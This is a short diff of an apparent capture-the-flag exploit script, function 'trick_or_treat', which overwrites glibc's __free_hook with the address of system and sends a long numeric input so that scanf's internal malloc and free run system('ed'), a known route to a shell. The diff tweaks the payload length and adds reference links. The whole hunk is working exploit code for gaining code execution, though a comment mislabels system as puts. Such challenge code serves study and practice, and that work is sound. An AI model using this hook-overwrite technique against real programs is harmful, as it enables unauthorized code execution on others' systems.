@@ -44,7 +44,8 @@ def trick_or_treat(DEBUG):
 	r.sendline(hex(offset) + " " +  hex(system)) # overwrite __free_hook with puts function address
 
 	r.recvuntil("Offset & Value:\x00")
-	payload = "2"*0x1000 # trigger malloc + free => __free_hook
+	payload = "2"*1024 # trigger malloc + free => __free_hook 
+	# https://code.woboq.org/userspace/glibc/stdio-common/vfscanf-internal.c.html#736
 	payload += " "
 	payload += "ed" # system("ed")
 	# https://www.gnu.org/software/ed/manual/ed_manual.html
